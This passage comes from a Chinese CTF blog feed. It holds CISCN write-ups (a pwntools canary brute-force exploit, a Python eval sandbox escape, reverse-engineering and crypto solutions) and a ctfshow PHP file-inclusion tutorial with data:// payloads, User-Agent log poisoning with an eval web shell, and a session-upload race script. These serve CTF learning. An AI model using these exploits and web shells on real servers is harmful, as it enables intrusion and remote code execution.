class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line">elf = ELF(&#x27;./funcanary&#x27;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">if local:</span><br><span class="line">    p = process(&#x27;./funcanary&#x27;)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">    p = remote(&#x27;47.94.206.10&#x27;,29297)</span><br><span class="line">   # libc = ELF(&#x27;./&#x27;)</span><br><span class="line">p.recvuntil(&#x27;welcome\n&#x27;)</span><br><span class="line">canary = b&#x27;\x00&#x27;</span><br><span class="line">for k in range(7):</span><br><span class="line">    for i in range(256):</span><br><span class="line">        print (&quot;the &quot; + str(k) + &quot;: &quot; + str(i))</span><br><span class="line">        p.send(b&#x27;a&#x27;*0x68 + canary + p8(i))</span><br><span class="line">        a = p.recvuntil(&quot;welcome\n&quot;)</span><br><span class="line">        print (a)</span><br><span class="line">        if &quot;fun&quot; in str(a):</span><br><span class="line">                canary += p8(i)</span><br><span class="line">                print(&#x27;canary:&#x27;)</span><br><span class="line">                print(canary)</span><br><span class="line">                break</span><br><span class="line">                </span><br><span class="line">print(canary)</span><br><span class="line">target=0x1228</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x02&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x12&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x22&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x32&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x42&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x52&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x62&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x72&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x82&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x92&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xa2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xb2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xc2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xd2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xe2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xf2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h1><h2 id="27-签到卡"><a href="#27-签到卡" class="headerlink" title="27_签到卡"></a>27_签到卡</h2><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1685266137154-e562de8e-145a-4c53-9ba4-1d691c3b6c0a.png" alt="image.png"><br>把/etc/passwd改为/flag即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1685266206911-f3dfffcb-b96c-4bfc-9c6c-8bbaa548aa14.png" alt="image.png"><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2>nc到远端，发现输入什么命令都是nop，但是字符串可以回显，但是长度还有所限制，用“_”拼接（“_”可以表示上一次执行的结果），再用“+”拼接成一条字符串表达式，用eval()函数执行</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;__imp&#x27;</span></span><br><span class="line"><span class="comment">#&#x27;__imp&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;ort&#x27;</span></span><br><span class="line"><span class="comment">#&#x27;__import&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;__(&#x27;</span></span><br><span class="line"><span class="comment">#&#x27;__import__(&#x27;</span></span><br><span class="line">_+<span class="string">&quot;&#x27;os&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&quot;</span></span><br><span class="line">_+<span class="string">&quot;&#x27;).&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).&quot;</span></span><br><span class="line">_+<span class="string">&quot;sys&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).sys&quot;</span></span><br><span class="line">_+<span class="string">&quot;tem&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system&quot;</span></span><br><span class="line">_+<span class="string">&quot;(&#x27;c&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;c&quot;</span></span><br><span class="line">_+<span class="string">&quot;at &quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;cat &quot;</span></span><br><span class="line">_+<span class="string">&quot;/f*&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&quot;</span></span><br><span class="line">_+<span class="string">&quot;&#x27;)&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(_)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="网络安全人才实战能力评价现状调查问卷"><a href="#网络安全人才实战能力评价现状调查问卷" class="headerlink" title="网络安全人才实战能力评价现状调查问卷"></a>网络安全人才实战能力评价现状调查问卷</h2><p>交完问卷出flag</p><h1 id="Re-1"><a href="#Re-1" class="headerlink" title="Re"></a>Re</h1><h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p>先打开看看，xml不是很懂，google了一下<a href="https://snap.berkeley.edu/">snap</a>这个网站用法，打开这个网站导入xml。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574488-88897496-5683-4038-a914-e540254aaf7f.png" alt="image.png"><br>跟着步骤走，点击绿旗子按空格开始<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574961-d96409ba-4664-4b49-903b-49da9aa9f548.png" alt="image.png"><br>运行到lock这里提示输入flag，看到lock的控件里面有多个插入数字操作，应该是密文<br>提取出来得到<code>[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575470-1a7f2707-9427-480a-bae4-b585f92cb8fb.png" alt="image.png"><br>加密逻辑在右边，是各项异或<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574439-63fef859-1b6e-4212-a653-8a2d0970e8d0.png" alt="image.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># babyRE</span></span><br><span class="line">flag=[<span class="number">102</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">28</span>,<span class="number">74</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">85</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">75</span>,<span class="number">20</span>,<span class="number">92</span>,<span class="number">92</span>,<span class="number">8</span>,<span class="number">28</span>,<span class="number">25</span>,<span class="number">81</span>,<span class="number">83</span>,<span class="number">7</span>,<span class="number">28</span>,<span class="number">76</span>,<span class="number">88</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">29</span>,<span class="number">73</span>,<span class="number">0</span>,<span class="number">86</span>,<span class="number">4</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">4</span>,<span class="number">85</span>,<span class="number">87</span>,<span class="number">30</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i]=flag[i] ^ flag[i-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>flag&#123;12307bbf-9e91-4e61-a900-dd26a6d0ea4c&#125;</code></p><h2 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h2><p>登录网站试了一下注入好像不行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574338-83b939d1-02c4-479d-a841-af1c58f9c8af.png" alt="image.png"><br>提示说是找附件漏洞，那就找呗，一堆apk里面就cpweb.apk最可疑<br>用jadx-gui打开，查看一下。先搜索MainActivity，但是好像没啥有用的东西<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575624-7f32685f-51c9-4514-aba5-500a2d98f94b.png" alt="image.png"><br>但是跟MainActivity同目录下有好多个Server，猜测漏洞可能就出在这里，重点看了一下WebServer<br>这里有个路径穿越拼接，应该可以利用这个漏洞。请队里的web手抓包一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575781-1972b843-34d4-4d88-8fe1-df65ec45b035.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685269052746-fa0d3dab-1e41-4f3a-a1d2-92ea55c9b64d.png" alt="image.png"></p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>flag&#123;15131359-6d71-45d3-b2ad-73e2f2335a7c&#125;</code></p><h1 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="27日-基于国密SM2算法的密钥密文分发"><a href="#27日-基于国密SM2算法的密钥密文分发" class="headerlink" title="27日_基于国密SM2算法的密钥密文分发"></a>27日_基于国密SM2算法的密钥密文分发</h2><blockquote><p><a href="https://const.net.cn/tool/sm2/genkey/">https://const.net.cn/tool/sm2/genkey/</a><br><a href="https://const.net.cn/tool/sm2/sm2-decrypt/">https://const.net.cn/tool/sm2/sm2-decrypt/</a><br><a href="https://const.net.cn/tool/sm4/sm4-ecb-decrypt/">https://const.net.cn/tool/sm4/sm4-ecb-decrypt/</a> </p></blockquote><p>使用网站内容按照步骤操作即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685167591369-86affce6-458e-4054-ac34-059c28c9035e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685167558494-787731cf-a5ab-49c2-bede-5f12f52b8747.png" alt="image.png"></p><h2 id="27日-Sign-in-passwd"><a href="#27日-Sign-in-passwd" class="headerlink" title="27日_Sign_in_passwd"></a>27日_Sign_in_passwd</h2><p>按照排列映射加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import urllib.parse</span><br><span class="line">after = r&#x27;GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5&#x27;</span><br><span class="line">asc = urllib.parse.unquote(after)</span><br><span class="line">former = r&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span><br><span class="line">change = str.maketrans(asc, former)</span><br><span class="line">flag = r&#x27;j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D&#x27;</span><br><span class="line">flaga = flag.translate(change)</span><br><span class="line">print(base64.b64decode(flaga).decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web78-88+web116-117文件包含篇</title>
      <link href="/2023/05/16/web78-88-web116-117%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/"/>
      <url>/2023/05/16/web78-88-web116-117%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>做前看看：<a href="https://blog.csdn.net/qq_42181428/article/details/87090539?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163818231816780264086483%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163818231816780264086483&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-87090539.pc_search_result_control_group&utm_term=ctf%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_42181428/article/details/87090539?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163818231816780264086483%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163818231816780264086483&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduend~default-1-87090539.pc_search_result_control_group&amp;utm_term=ctf%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187</a></p></blockquote><h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><p>直接使用hackbar自带的php base64获取即可，位置如图：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681571166346-f2e58cdd-c878-4c88-bca9-c52ed4e5fb09.png" alt="image.png"><br>然后将获取到的字符串用hackbar自带的base64解密即可。如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681571209716-ba6e58a4-6688-4832-8f76-7aaae4ef0675.png" alt="image.png"></p><h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    include(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想太长了，payload：<code>?file=data://text/plain,&lt;?=file_get_contents(base64_decode(&#39;ZmxhZy5waHA=&#39;))?&gt;</code><br>hint中给出了使用伪协议的解密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="line"></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了php、data字符。</p><h2 id="PHPinput伪协议"><a href="#PHPinput伪协议" class="headerlink" title="PHPinput伪协议*"></a>PHPinput伪协议*</h2><p>但是php伪协议可以用大小写绕过：<code>PHP://input</code><br>然后在post中传入木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是不知道为什么我这里没有成功？</p><h2 id="日志包含绕过："><a href="#日志包含绕过：" class="headerlink" title="日志包含绕过："></a>日志包含绕过：</h2><p>在UA中注入木马，然后在日志中GET或者POST执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681898347352-ca91ad31-e901-4a84-8fe0-2b4d0fb7ed64.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681898407222-78a6b8b9-6313-4f58-949a-f12a3eff1195.png" alt="image.png"><br><code>?file=/var/log/nginx/access.log&amp;1=system(&#39;ls&#39;);</code><br>payload：<code>?file=/var/log/nginx/access.log&amp;1=system(&#39;cat fl0g.php&#39;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681898480915-79a1b2f5-cce7-4687-ab06-72de66c461b6.png" alt="image.png"></p><h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>同上一题，日志命令执行</p><h1 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h1><blockquote><p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a><br><a href="https://blog.csdn.net/weixin_46003360/article/details/119045296">https://blog.csdn.net/weixin_46003360/article/details/119045296</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理浅析：</p><ul><li>当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。一般的linux会将session保存在其中的某一个目录下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/</span><br><span class="line">/var/lib/php/sessions/</span><br><span class="line">/tmp/</span><br><span class="line">/tmp/sessions/</span><br></pre></td></tr></table></figure><ul><li>一般开发的web服务会使用多线程接收用户的请求，而线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，依靠临界区(critical section)。session的临界区即上文说的临时目录。如果没有应用好同步技术则会产生“竞争条件”问题。意外生成攻击者想要生成的文件，这样攻击者可以在该文件还未被删除的时间段内进行非法操作。</li><li>PHP_SESSION_UPLOAD_PROGRESS用于设置/tmp目录下生成的sess_PHPSESSID文件的内容</li></ul><p>所以我们可以使用python脚本进行多线程请求，生成sess_PHPSESSID文件，实现rce。<br>python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a1ec5255-7dd7-405a-8c05-d61d50ce9ed7.challenge.ctf.show:8080/&#x27;</span>    <span class="comment"># 改成自己的url</span></span><br><span class="line">sessionid = <span class="string">&#x27;truthahn&#x27;</span>      <span class="comment"># 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahn</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):<span class="comment"># write()函数用于写入session临时文件</span></span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)    <span class="comment"># 设置上传文件的大小为50k</span></span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?=eval($_POST[1])?&gt;&#x27;</span>    <span class="comment"># 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?&gt; 实现一句话</span></span><br><span class="line">    &#125;</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;truthahn.jpg&#x27;</span>,fileBytes)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:    </span><br><span class="line">        res = session.post(url,data=data2,cookies=cookies,files=files)</span><br><span class="line">        <span class="comment"># 